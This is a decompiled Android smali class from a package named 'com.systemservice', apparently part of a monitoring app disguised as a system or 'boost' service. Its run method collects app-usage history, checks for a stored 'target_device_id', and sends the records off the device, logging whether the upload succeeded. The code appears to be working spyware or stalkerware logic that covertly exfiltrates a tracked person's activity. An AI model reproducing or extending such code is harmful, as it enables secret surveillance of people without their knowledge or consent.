.class final Lcom/systemservice/common/boostReceiver/a;
.super Ljava/lang/Object;
.source ""

# interfaces
.implements Ljava/lang/Runnable;


# annotations
.annotation system Ldalvik/annotation/EnclosingMethod;
    value = Lcom/systemservice/common/boostReceiver/b;->a(Landroid/content/Context;Landroid/content/SharedPreferences;Lcom/systemservice/a/h/d;)V
.end annotation

.annotation system Ldalvik/annotation/InnerClass;
    accessFlags = 0x8
    name = null
.end annotation


# instance fields
.field final synthetic a:Landroid/content/Context;

.field final synthetic b:Lcom/systemservice/a/h/d;

.field final synthetic c:Landroid/content/SharedPreferences;


# direct methods
.method constructor <init>(Landroid/content/Context;Lcom/systemservice/a/h/d;Landroid/content/SharedPreferences;)V
    .locals 0

    iput-object p1, p0, Lcom/systemservice/common/boostReceiver/a;->a:Landroid/content/Context;

    iput-object p2, p0, Lcom/systemservice/common/boostReceiver/a;->b:Lcom/systemservice/a/h/d;

    iput-object p3, p0, Lcom/systemservice/common/boostReceiver/a;->c:Landroid/content/SharedPreferences;

    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    return-void
.end method


# virtual methods
.method public run()V
    .locals 6

    :try_start_0
    iget-object v0, p0, Lcom/systemservice/common/boostReceiver/a;->a:Landroid/content/Context;

    invoke-static {v0}, Lcom/systemservice/common/features/settingHistory/b;->c(Landroid/content/Context;)Z

    move-result v0

    if-eqz v0, :cond_2

    iget-object v0, p0, Lcom/systemservice/common/boostReceiver/a;->b:Lcom/systemservice/a/h/d;

    const/4 v1, 0x0

    const/4 v2, 0x0

    invoke-virtual {v0, v2, v1, v1}, Lcom/systemservice/a/h/d;->a(ZLjava/util/Date;Ljava/util/Date;)Ljava/util/List;

    move-result-object v0
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    const-string v1, "ZAppUse"

    if-eqz v0, :cond_1

    :try_start_1
    invoke-interface {v0}, Ljava/util/List;->size()I

    move-result v3

    if-lez v3, :cond_1

    iget-object v3, p0, Lcom/systemservice/common/boostReceiver/a;->c:Landroid/content/SharedPreferences;

    const-string v4, "target_device_id"

    const-string v5, ""

    invoke-interface {v3, v4, v5}, Landroid/content/SharedPreferences;->getString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v3}, Ljava/lang/String;->isEmpty()Z

    move-result v3

    if-nez v3, :cond_1

    new-instance v3, Lcom/systemservice/a/c/a/d;

    iget-object v4, p0, Lcom/systemservice/common/boostReceiver/a;->a:Landroid/content/Context;

    invoke-direct {v3, v4, v2}, Lcom/systemservice/a/c/a/d;-><init>(Landroid/content/Context;Z)V

    iget-object v2, p0, Lcom/systemservice/common/boostReceiver/a;->a:Landroid/content/Context;

    invoke-virtual {v3, v2, v0}, Lcom/systemservice/a/c/a/d;->a(Landroid/content/Context;Ljava/util/List;)I

    move-result v2

    const/4 v3, 0x1

    if-ne v2, v3, :cond_0

    const-string v2, "SEND App Usage PACKAGE SUCCESSFUL"

    invoke-static {v1, v2}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    iget-object v2, p0, Lcom/systemservice/common/boostReceiver/a;->b:Lcom/systemservice/a/h/d;

    invoke-virtual {v2, v0}, Lcom/systemservice/a/h/d;->a(Ljava/util/List;)V

    goto :goto_0

    :cond_0
    iget-object v3, p0, Lcom/systemservice/common/boostReceiver/a;->b:Lcom/systemservice/a/h/d;

    invoke-virtual {v3, v0}, Lcom/systemservice/a/h/d;->a(Ljava/util/List;)V

    new-instance v3, Ljava/lang/StringBuilder;

    invoke-direct {v3}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v3, v2}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    const-string v2, "SEND App Usage PACKAGE ERROR"

    invoke-virtual {v3, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    invoke-static {v1, v2}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    :cond_1
    :goto_0
    new-instance v2, Ljava/lang/StringBuilder;

    invoke-direct {v2}, Ljava/lang/StringBuilder;-><init>()V

    invoke-interface {v0}, Ljava/util/List;->size()I

    move-result v0

    invoke-virtual {v2, v0}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    const-string v0, " = Size"

    invoke-virtual {v2, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-static {v1, v0}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_0

    goto :goto_1

    :catch_0
    move-exception v0

    invoke-virtual {v0}, Ljava/lang/Exception;->getMessage()Ljava/lang/String;

    move-result-object v0

    const-string v1, "TAG"

    invoke-static {v1, v0}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    :cond_2
    :goto_1
    return-void
.end method
